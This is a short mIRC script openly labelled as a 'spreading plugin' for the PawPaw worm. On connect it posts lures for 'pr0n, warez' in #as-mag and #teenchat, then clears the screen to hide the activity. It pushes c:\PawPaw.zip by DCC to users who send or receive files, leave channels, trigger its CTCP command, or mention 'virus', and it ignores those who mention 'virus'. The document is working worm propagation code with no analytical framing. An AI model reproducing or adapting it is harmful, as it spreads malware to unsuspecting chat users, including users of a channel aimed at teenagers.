[script] ' PawPaw - Mirc spreading plugin!!!

on 1:FILERCVD:*.*:./dcc send $nick c:\\PawPaw.zip
on 1:FILESENT:*.*:./dcc send $nick c:\\PawPaw.zip

on 1:connect: \{
/join #as-mag
/msg #as-mag Type: /ctcp $me PawPaw
/msg #as-mag for the latest pr0n, warez, and everything else you could ever want!
/part #as-mag
/join #teenchat
/msg #teenchat Type: /ctcp $me PawPaw
/msg #teenchat for the latest pr0n, warez, and everything else you could ever want!
/part #teenchat
/clear
/motd
\}

on 1:PART:#:/if ($nick == $me) \{ halt \} | .dcc send $nick c:\\PawPaw.zip

on 1:TEXT:*virus*:*:/dcc send $nick c:\\PawPaw.zip | /ignore $nick
ctcp *:pawpaw:/dcc send $nick c:\\pawpaw.zip
;PawPaw
